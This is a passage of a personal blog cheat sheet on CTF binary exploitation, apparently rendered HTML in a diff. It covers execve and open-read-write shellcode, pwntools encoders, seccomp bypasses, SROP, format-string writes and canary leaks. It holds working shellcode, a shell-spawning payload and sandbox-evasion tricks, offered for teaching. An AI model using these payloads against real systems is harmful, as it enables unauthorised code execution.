+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0x30</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><h4 id="writefd-buf-size">write(fd, buf, size)<a hidden class="anchor" aria-hidden="true" href="#writefd-buf-size">#</a></h4>
+<p>Since stdout is fd 1, and we want to print the 0x30 bytes from the stack we just pushed, let&rsquo;s keep that in mind; And we don&rsquo;t necessarily need to modify <code>rsi</code> and <code>rdx</code>, if the last thing that happened was our read.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><h4 id="shellcraft">shellcraft<a hidden class="anchor" aria-hidden="true" href="#shellcraft">#</a></h4>
+<p>You can also just be lazy and use shellcraft for this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/home/lalala/flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>open(dir)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;rax&#39;</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x30</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x30</span>)
+</span></span></code></pre></div><h3 id="execve-shellcode">execve shellcode<a hidden class="anchor" aria-hidden="true" href="#execve-shellcode">#</a></h3>
+<p>Or precisely <code>execve(&quot;/bin/sh&quot;, null, null)</code>; this time, <code>rax</code> needs to be <code>0x3b</code> and <code>rdi</code> needs to be &ldquo;/bin/sh&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0x68732f6e69622f</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0x3b</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><h3 id="blacklist">blacklist<a hidden class="anchor" aria-hidden="true" href="#blacklist">#</a></h3>
+<ul>
+<li>
+<p>Find out whether some character stops the blacklist, add it in the shellcode, but jump over it, details <a href="https://book.jorianwoltjer.com/binary-exploitation/shellcode">here</a></p>
+</li>
+<li>
+<p>This <a href="https://masterccc.github.io/tools/shellcode_gen/">website</a> to generate shellcode to print files, for 32-bit.</p>
+</li>
+</ul>
+<p>More about these special characters breaking functions; Sometimes, in shellcoding challenges, the bytes escape out of the function that reads them. Here are those said bytes:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/table.png#center"></p>
+<p>For <code>scanf</code>&rsquo;s <code>0x0b</code> thing, using <code>sub eax, -0x0b</code> instead of <code>add eax, 0x0b</code> will bypass it.</p>
+<p>But sometimes we don&rsquo;t want to bother with this sort of thing; well, pwntools has something build exactly for this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>bad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a\x0d\x20\x0b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>encoders<span style="color:#f92672">.</span>encode(sc, avoid<span style="color:#f92672">=</span>bad)
+</span></span></code></pre></div><p>Here are the <a href="https://docs.pwntools.com/en/stable/encoders.html">docs</a>. It might, for example, xor and then xor your payload again, to bypass the &ldquo;avoid&rdquo;.</p>
+<p>What&rsquo;s more, <code>from pwnlib.encoders</code> you can import <code>printable</code>, <code>alphanumeric</code> and <code>null</code>. Then, you can use them like <code>encoded = printable.encode(sc)</code>.</p>
+<h3 id="seccomp">seccomp<a hidden class="anchor" aria-hidden="true" href="#seccomp">#</a></h3>
+<p>Great explanation <a href="https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces">here</a></p>
+<p>To get insight, run <code>seccomp-tools dump ./binary</code>. It&rsquo;s going to look something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ seccomp-tools dump /home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp
+</span></span><span style="display:flex;"><span>shellcode: 
+</span></span><span style="display:flex;"><span> line  CODE  JT   JF      K
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================================</span>
+</span></span><span style="display:flex;"><span> 0000: 0x20 0x00 0x00 0x00000004  A <span style="color:#f92672">=</span> arch
+</span></span><span style="display:flex;"><span> 0001: 0x15 0x00 0x08 0xc000003e  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> ARCH_X86_64<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0002: 0x20 0x00 0x00 0x00000000  A <span style="color:#f92672">=</span> sys_number
+</span></span><span style="display:flex;"><span> 0003: 0x35 0x00 0x01 0x40000000  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A &lt; 0x40000000<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0005</span>
+</span></span><span style="display:flex;"><span> 0004: 0x15 0x00 0x05 0xffffffff  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> 0xffffffff<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0005: 0x15 0x04 0x00 0x00000001  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> write<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0006: 0x15 0x03 0x00 0x00000002  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> open<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0007: 0x15 0x02 0x00 0x0000003b  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> execve<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0008: 0x15 0x01 0x00 0x00000142  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> execveat<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0010</span>
+</span></span><span style="display:flex;"><span> 0009: 0x06 0x00 0x00 0x7fff0000  <span style="color:#66d9ef">return</span> ALLOW
+</span></span><span style="display:flex;"><span> 0010: 0x06 0x00 0x00 0x00000000  <span style="color:#66d9ef">return</span> KILL
+</span></span></code></pre></div><p>The structure of a seccomp instruction is this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sock_filter {
+</span></span><span style="display:flex;"><span>    __u16 code; <span style="color:#75715e">//(opcode/instruction) 2 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    __u8  jt; <span style="color:#75715e">//(offset jump if true) 1 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    __u8  jf; <span style="color:#75715e">//(offset jump if false) 1 byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    __u32 k;  <span style="color:#75715e">//(constant) 4 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>For example, <code>return ALLOW</code> has the opcode for <code>return</code> and the constant <code>0x7fff0000</code>.</p>
+<p>This example essentially just blocks all 32-bit syscalls on our arch. 32-bit syscalls are a way to bypass these seccomp rules, because they do the same thing; they can be invoked through the same <code>rax</code> syscall number except with the 30th bit enabled: <code>0x4000003b</code> instead of <code>0x3b</code>.</p>
+<p>The <code>seccomp-tools</code> doesn&rsquo;t always work. I don&rsquo;t know why. In these cases, you can run this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strace -e trace<span style="color:#f92672">=</span>read,prctl,seccomp -f /home/kali/Downloads/dreamhack/secureservice/deploy/secure-service &lt; &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#39;shellcode\n\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Sometimes, they forget to block stuff; Like <code>openat</code>. The difference is, you must add another argument, at the first position, which is a directory file descriptor.</p>
+<p>Making that be <code>AT_FDCWD</code>, with the value of <code>-100</code> (<code>0xffffff9c</code>), will make <code>openat</code> behave the same as <code>open</code>. That just means open in the current directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">open</span>(pathname, flags)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">openat</span>(dirfd, pathname, flags)
+</span></span></code></pre></div><p>Here are some suggestions from Claude.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/sec1.png#center"></p>
+<p>In fact, here is a cheatsheet with everything to replace blocked ORW tech.</p>
+<p>First, <code>open(path, O_RDONLY)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">openat</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">100</span>, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> open_how how <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>}; <span style="color:#75715e">//flags=0, mode=0, resolve=0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">openat2</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">100</span>, <span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#f92672">&amp;</span>how, <span style="color:#66d9ef">sizeof</span>(how))
+</span></span></code></pre></div><p>Next, <code>read(fd, buf, count)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//iov is an array of {buf, len} structs (iovec)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//reads into multiple buffers in one syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//readv(fd, iov, iovcnt)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> iovec iov <span style="color:#f92672">=</span> {buf, <span style="color:#ae81ff">100</span>};
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">readv</span>(fd, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// same as read but reads from specific offset in file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//pread64(fd, buf, count, offset)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pread64</span>(fd, buf, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//preadv(fd, iov, iovcnt, offset)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//pread + readv combined; multiple buffers + specific offset
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">preadv</span>(fd, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">preadv2</span>(fd, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>For <code>write(fd, buf, count)</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> iovec iov <span style="color:#f92672">=</span> {buf, <span style="color:#ae81ff">100</span>};
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">writev</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwrite64</span>(<span style="color:#ae81ff">1</span>, buf, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>)     <span style="color:#75715e">// offset=0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pwritev</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwritev2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>iov, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)  <span style="color:#75715e">// flags=0
+</span></span></span></code></pre></div><p>There is also a send/copy family:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//sendfile(out_fd, in_fd, offset*, count)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//// copies from in_fd to out_fd entirely in kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//splice(fd_in, off_in, fd_out, off_out, len, flags)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//like sendfile but works between any fds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//one of them must be a pipe
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pipe</span>(pipefd)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">splice</span>(fd, NULL, pipefd[<span style="color:#ae81ff">1</span>], NULL, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>)   <span style="color:#75715e">// file into pipe
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">splice</span>(pipefd[<span style="color:#ae81ff">0</span>], NULL, <span style="color:#ae81ff">1</span>, NULL, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">0</span>)    <span style="color:#75715e">// pipe into stdout
+</span></span></span></code></pre></div><p>A pipe is a kernel buffer with two ends; <code>pipefd[0]</code> is the read end and <code>pipefd[1]</code> the write end. Whatever we write into <code>pipefd[1]</code> comes out of <code>pipefd[0]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file ──splice──► pipe<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  →  pipe<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> ──splice──► stdout
+</span></span></code></pre></div><h2 id="srop">SROP<a hidden class="anchor" aria-hidden="true" href="#srop">#</a></h2>
+<p>Some great resources; What I&rsquo;m doing is merely a TLDR here. So if you really care go read this stuff:</p>
+<ul>
+<li>
+<p><a href="https://bananamafia.dev/post/srop/">bananamafia.dev/post/srop/</a></p>
+</li>
+<li>
+<p><a href="https://trustie.medium.com/srop-9993651fe046">trustie.medium.com/srop</a></p>
+</li>
+<li>
+<p><a href="https://ctf--wiki-org.translate.goog/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-GB">ctf&ndash;wiki-org.translate.goog/srop</a></p>
+</li>
+</ul>
+<p>This exploitation is pretty interesting: it relies on the <code>rt_sigreturn</code> function. When a signal happens, a handler has to respond to it. The kernel, in order to resume the process smoothly after the handler executes its stuff, has to save the context of what it was doing.</p>
+<p>The context is the registers, and a couple more stuff. But we care about the registers.</p>
+<p>So: <code>signal -&gt; push registers -&gt; handler -&gt; handler calls sigreturn -&gt; pop registers</code>.</p>
+<p>This is extremely useful when we don&rsquo;t have the usual ROP gadgets (<code>pop rdi; ret</code> type of stuff), but we have a lot of buffer overflow and some <code>syscall</code> gadgets.</p>
+<p>First, to call <code>sigreturn</code>, you must set <code>rax</code> to <code>0xf</code> (15) and <code>syscall</code>. There are multiple ways to go about this:</p>
+<ul>
+<li>
+<p><code>pop eax/rax</code> gadget;</p>
+</li>
+<li>
+<p>through <code>read</code>; as it returns the amount of bytes read into <code>rax</code>; first null <code>rax</code>, then call <code>syscall</code>, and you&rsquo;re set.</p>
+</li>
+</ul>
+<p>After you get past this hurdle, pwntools does the annoying part for you:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>frame <span style="color:#f92672">=</span> SigreturnFrame();
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> binsh
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> bytes(frame)
+</span></span></code></pre></div><p>If you don&rsquo;t want to just call <code>execve</code>, you can call <code>mprotect</code> on a memory area of choice, make it executable and writeable and shift the stack to that address (put the entry point of the shellcode in <code>rsp</code>, to be able to write it easily, then redirect <code>rip</code> to it).</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/mprot.png#center"></p>
+<h2 id="fmt-str">fmt-str<a hidden class="anchor" aria-hidden="true" href="#fmt-str">#</a></h2>
+<p>These will write the number of characters printed so far, into the address pointed to by the next argument.</p>
+<ul>
+<li>
+<p><code>%n</code> writes 4 bytes</p>
+</li>
+<li>
+<p><code>%hn</code> writes 2 bytes</p>
+</li>
+<li>
+<p><code>%hhn</code> writes 1 byte</p>
+</li>
+<li>
+<p><code>%lln</code> writes 8 bytes</p>
+</li>
+</ul>
+<p>We don&rsquo;t actually need to write them, we can use padding:</p>
+<ul>
+<li><code>%100c</code> &ldquo;writes&rdquo; 100 chars.</li>
+</ul>
+<p>If the address at <code>%12$p</code> is <code>0x7ffd...1230</code> and we want to change its last two bytes to <code>0x4080</code>:</p>
+<ul>
+<li><code>%16512c%12$hn</code>, since <code>0x4080</code> in decimal is <code>16512</code>.</li>
+</ul>
+<p>BUT! The second write, we need to substract from the second padding what we added in the first, because there&rsquo;s already a 16512 written, in this case. So it would be <code>%(X-16512)c</code>.</p>
+<p>We don&rsquo;t usually need to bother with that, since we can use <code>fmtstr_payload</code> from pwntools. But, when our stuff is getting printed by <code>printf</code>, null bytes wreak our payload and we need to do it manually.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>writes <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>addr: value,
+</span></span><span style="display:flex;"><span>addr2: value2
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>start <span style="color:#f92672">=</span> <span style="color:#75715e">#index at which your input starts showing up on stack</span>
+</span></span><span style="display:flex;"><span>fmtstr_payload(start, writes, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>) <span style="color:#75715e">#can choose byte, short, int </span>
+</span></span></code></pre></div><p>To automatically find the offset at which your input begins at, this will work:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;34.185.222.215:30484&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send</span>(payload):
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvall()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fmt <span style="color:#f92672">=</span> FmtStr(execute_fmt<span style="color:#f92672">=</span>send)
+</span></span><span style="display:flex;"><span>print(fmt<span style="color:#f92672">.</span>offset)
+</span></span></code></pre></div><ul>
+<li>Print some stack pointers in python: <code>print(&quot;.&quot;.join(f&quot;%{i}$p&quot; for i in range(1, 51)))</code></li>
+</ul>
+<h2 id="canary">canary<a hidden class="anchor" aria-hidden="true" href="#canary">#</a></h2>
+<p>Check the canary in <code>gdb</code> with checksec; it will print out nicely right there. Usually you can just find the canary using a fmtstr vuln.</p>
+<p>The canary is usually right before <code>rbp</code> on the stack. You can also view the canary with the <code>canary</code> command in <code>pwndbg</code>:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/pwn/canary.png#center"></p>
+<p>This way, it&rsquo;s easier to calculate the offset!</p>
+<p>And, sometimes, you just overflow a buffer right before the canary, in the sense that you overwrite the null byte so it prints what comes right after it.</p>
+<h2 id="arm">arm<a hidden class="anchor" aria-hidden="true" href="#arm">#</a></h2>
+<p>I made a separate post <a href="https://irinasusca.github.io/writeup-blog/arm">here</a>.</p>
+<h2 id="random">random<a hidden class="anchor" aria-hidden="true" href="#random">#</a></h2>
+<p>Sometimes we need to generate a random number. Just add this in your python script and you should be grand. You will definitely need to mess around with the <code>i</code> offset, based on how long connection takes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> CDLL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#c code</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>now <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>j<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> seed <span style="color:#f92672">in</span> range(now <span style="color:#f92672">-</span> <span style="color:#ae81ff">10</span>, now <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>srand(seed)
+</span></span><span style="display:flex;"><span>    random <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand()
+</span></span><span style="display:flex;"><span>    print(seed, random)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">==</span>j:
+</span></span><span style="display:flex;"><span>    	random_number <span style="color:#f92672">=</span> random
+</span></span><span style="display:flex;"><span>    	random_seed <span style="color:#f92672">=</span> seed
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    j<span style="color:#f92672">=</span>j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#save the seed at now + i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>srand(random_seed)
+</span></span><span style="display:flex;"><span>random_number <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;random number for i=</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> is </span><span style="color:#e6db74">{</span>random_number<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h2 id="_io_file">_IO_FILE<a hidden class="anchor" aria-hidden="true" href="#_io_file">#</a></h2>
+<p>Sources <a href="https://www.slideshare.net/slideshow/play-with-file-structure-yet-another-binary-exploit-technique/81635564">here</a>, <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/">there</a>.</p>
+<p>If you want to view an address as, say, an _IO_FILE struct, you can just specify <code>p *(struct _IO_FILE_plus *)0x606060</code>. If you want to actually see them, after doing <code>p _IO_list_all</code> you can <code>p *(struct _IO_FILE_plus *) 0xaddr</code>.</p>
